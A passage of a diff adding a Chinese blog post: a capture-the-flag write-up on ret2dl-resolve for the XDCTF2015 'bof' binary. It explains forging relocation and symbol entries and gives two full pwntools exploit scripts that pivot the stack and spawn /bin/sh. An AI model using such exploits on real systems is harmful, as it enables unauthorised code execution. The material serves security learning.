class="number">04</span>:<span class="number">0010</span>│          <span class="number">0x804a850</span> ◂— <span class="number">0x1</span></span><br><span class="line">05:0014│          0x804a854 —▸ 0x804a890 ◂— '/bin/sh'</span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│          <span class="number">0x804a858</span> ◂— <span class="number">0x7</span></span><br><span class="line">07:001c│          0x804a85c ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh'</span><br></pre></td></tr></table></figure>
+
+<p>接下来部署真实的ROP链，再复习一下 _dl_runtime_resolve的过程</p>
+<ol>
+<li>用<strong>link_map</strong>访问.<strong>dynamic</strong>，取出.<strong>dynstr</strong>, .<strong>dynsym</strong>, <strong>.rel.plt</strong>的指针</li>
+<li><strong>.rel.plt + 第二个参数</strong>求出当前函数的重定位表项<strong>Elf32_Rel</strong>的指针，记作<strong>rel</strong></li>
+<li><strong>rel-&gt;r_info &gt;&gt; 8</strong>作为.<strong>dynsym</strong>的下标，求出当前函数的符号表项<strong>Elf32_Sym</strong>的指针，记作<strong>sym</strong></li>
+<li><strong>.dynstr + sym-&gt;st_name</strong>得出符号名字符串指针</li>
+<li>在动态链接库查找这个函数的地址，并且把地址赋值给<strong>*rel-&gt;r_offset</strong>，即<strong>GOT</strong>表</li>
+<li>调用这个函数 </li>
+</ol>
+<p><strong>_dl_runtime_resolve</strong>在第二步时</p>
+<blockquote>
+<p><strong>.rel.plt</strong> + 第二个参数求出当前函数的重定位表项<strong>Elf32_Rel</strong>的指针，记作<strong>rel</strong></p>
+</blockquote>
+<p>这个时候，<strong>_dl_runtime_resolve</strong>并没有检查<strong>.rel.plt</strong> + 第二个参数后是否造成越界访问，所以我们能给一个很大的<strong>.rel.plt</strong>的<strong>offset</strong>（64位的话就是下标），然后使得加上去之后的地址指向我们所能操纵的一块内存空间，比方说<strong>.bss</strong></p>
+<p>然后第三步</p>
+<blockquote>
+<p><strong>rel-&gt;r_info &gt;&gt; 8</strong>作为<strong>.dynsym</strong>的下标，求出当前函数的符号表项<strong>Elf32_Sym</strong>的指针，记作<strong>sym</strong></p>
+</blockquote>
+<p>所以在我们所伪造的<strong>Elf32_Rel</strong>，需要放一个<strong>r_info</strong>字段，大概长这样就行<strong>0xXXXXXX07</strong>，其中<strong>XXXXXX</strong>是相对<strong>.dynsym</strong>表的下标，注意不是偏移，所以是偏移除以<strong>Elf32_Sym</strong>的大小，即除以<strong>0x10</strong>（32位下）。然后这里同样也没有进行越界访问的检查，所以可以用类似的方法，伪造出这个<strong>Elf32_Sym</strong>。至于为什么是<strong>07</strong>，因为这是一个导入函数，而导入函数一般都是<strong>07</strong>，所以写成<strong>07</strong>就好</p>
+<p>然后第四步</p>
+<blockquote>
+<p><strong>.dynstr + sym-&gt;st_ame</strong>得出符号名字符串指针</p>
+</blockquote>
+<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/image003.jpg" alt="img"></p>
+<ul>
+<li><p>我们可以控制<strong>index_offset</strong>所以指向这个<strong>fake_stack</strong>上的一个位置即为我们布置的<strong>fake_reloc</strong></p>
+<ul>
+<li><p>需要通过计算得到<strong>index_offset</strong> 的值， 计算公式为：我们布置的<strong>fake_reloc</strong> 的地址 - <strong>rel.plt</strong> 的真实地址</p>
+</li>
+<li><p><strong>fake_reloc</strong>的结构，<strong>r_offset</strong>是函数 的 .<strong>got.plt</strong> 的地址 </p>
+<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;</span><br><span class="line">  Elf32_Word    r_info;</span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>让我们要做的是让<strong>fake_reloc</strong> 的<strong>r_info</strong> 指向 <strong>fake_sym</strong> 结构体</p>
+<ul>
+<li><p>计算方法为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">align = <span class="number">0x10</span>-(( fake_sym_addr - .dynsym ) &amp;<span class="number">7</span> );</span><br><span class="line">fake_sym_addr = fake_sym_addr + align ;</span><br><span class="line">index_dynsym = (fake_sym_addr - .dynsym )/<span class="number">0x10</span>;</span><br><span class="line">r_info = (index_dysym&lt;&lt;<span class="number">8</span>) | <span class="number">0x7</span>    <span class="comment">//保证这最后一字节为 0x07</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>劫持程序到<strong>fake_sym</strong>之后我们要做的就是让<strong>fake_sym</strong>指向我们定义的 <strong>.dynstr</strong> 中的对应函数字符串。一般<strong>fake_sym</strong>我们构造的结构为<strong>fake_sym = p32(st_name) + p32(0) + p32(0) +  p32(0x12)</strong>  ，<strong>st_name</strong>就是我们保存我字符串的地址</p>
+<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">st_name = (fake_sym_addr + <span class="number">0x10</span>) - dynstr <span class="comment">//0x10 刚好为fake_sym的大小刚好让 函数字符串 保存在这个位置。</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>让这个字符串为我们需要的如：<strong>system</strong> 那我们之后就能调用<strong>write</strong>从而调用<strong>system</strong> </p>
+</li>
+</ul>
+<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/QQ%E5%9B%BE%E7%89%8720191015221035.png" alt></p>
+<p>最终的Exploit</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./bof'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">ppp_ret = <span class="number">0x08048619</span> <span class="comment">#pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804861b</span> <span class="comment">#pop ebp ; ret</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment">#leave ; ret</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span> <span class="comment"># readelf -S pwn1 | grep ".bss"</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment">#readelf -S</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span></span><br><span class="line">dynsym = <span class="number">0x080481d8</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * offset</span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(<span class="number">100</span>)</span><br><span class="line">payload += p32(pop_ebp_ret)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt</span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">fake_dynstr = (fake_sym_addr + <span class="number">0x10</span>) - dynstr</span><br><span class="line">fake_sym = p32(fake_dynstr) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += <span class="string">'aaaa'</span></span><br><span class="line">payload2 += <span class="string">'aaaa'</span></span><br><span class="line">payload2 += fake_reloc</span><br><span class="line">payload2 += <span class="string">'B'</span> * align</span><br><span class="line">payload2 += fake_sym</span><br><span class="line">payload2 += <span class="string">"system\x00"</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += <span class="string">'/bin/sh\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>还有一种使用ROP模块写的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'main'</span>)</span><br><span class="line">r = process(<span class="string">'./main'</span>)</span><br><span class="line">rop = ROP(<span class="string">'./main'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## stack pivoting to bss segment</span></span><br><span class="line"><span class="comment">## new stack size is 0x800</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"><span class="comment">### padding</span></span><br><span class="line">rop.raw(<span class="string">'a'</span> * offset)</span><br><span class="line"><span class="comment">### read 100 byte to base_stage</span></span><br><span class="line">rop.read(<span class="number">0</span>, base_stage, <span class="number">100</span>)</span><br><span class="line"><span class="comment">### stack pivoting, set esp = base_stage</span></span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">r.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line"><span class="comment">## write sh="/bin/sh"</span></span><br><span class="line">rop = ROP(<span class="string">'./main'</span>)</span><br><span class="line">sh = <span class="string">"/bin/sh"</span></span><br><span class="line"></span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">'.plt'</span>).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">'.rel.plt'</span>).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">'.dynsym'</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">'.dynstr'</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">### making fake write symbol</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span></span><br><span class="line">                )  <span class="comment"># since the size of item(Elf32_Symbol) of dynsym is 0x10</span></span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (</span><br><span class="line">    fake_sym_addr - dynsym) / <span class="number">0x10</span>  <span class="comment"># calculate the dynsym index of write</span></span><br><span class="line"><span class="comment">## plus 10 since the size of Elf32_Sym is 16.</span></span><br><span class="line">st_name = fake_sym_addr + <span class="number">0x10</span> - dynstr</span><br><span class="line">fake_write_sym = flat([st_name, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">### making fake write relocation</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## making base_stage+24 ---&gt; fake reloc</span></span><br><span class="line">index_offset = base_stage + <span class="number">24</span> - rel_plt</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_write_reloc = flat([write_got, r_info])</span><br><span class="line"></span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br><span class="line"><span class="comment">## fake ret addr of write</span></span><br><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line">rop.raw(<span class="number">1</span>)</span><br><span class="line">rop.raw(base_stage + <span class="number">80</span>)</span><br><span class="line">rop.raw(len(sh))</span><br><span class="line">rop.raw(fake_write_reloc)  <span class="comment"># fake write reloc</span></span><br><span class="line">rop.raw(<span class="string">'a'</span> * align)  <span class="comment"># padding</span></span><br><span class="line">rop.raw(fake_write_sym)  <span class="comment"># fake write symbol</span></span><br><span class="line">rop.raw(<span class="string">'write\x00'</span>)  <span class="comment"># there must be a \x00 to mark the end of string</span></span><br><span class="line">rop.raw(<span class="string">'a'</span> * (<span class="number">80</span> - len(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">'a'</span> * (<span class="number">100</span> - len(rop.chain())))</span><br><span class="line"></span><br><span class="line">r.sendline(rop.chain())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/10/14/╤╙│┘░≤╢¿╨í╠╕/" rel="next" title="延迟绑定小谈">
+                  <i class="fa fa-chevron-left"></i> 延迟绑定小谈
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2019/10/27/ß█╖σ╝½┐═í¬í¬flodbg/" rel="prev" title="巅峰极客——flodbg">
+                  巅峰极客——flodbg <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Inhaltsverzeichnis
+        </li>
+        <li class="sidebar-nav-overview">
+          Übersicht
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ZERO-A-ONE</p>
+  <div class="site-description" itemprop="description">Resit much,Obey little</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">71</span>
+          <span class="site-state-item-name">Artikel</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">Kategorien</span>
+        
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ZERO-A-ONE</span>
+</div>
+  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>
+
+<div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv" style='display:none'>
+    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    <span class="post-meta-divider">|</span>
+</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+    有<span id="busuanzi_value_site_uv"></span>人看过我的博客啦
+</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
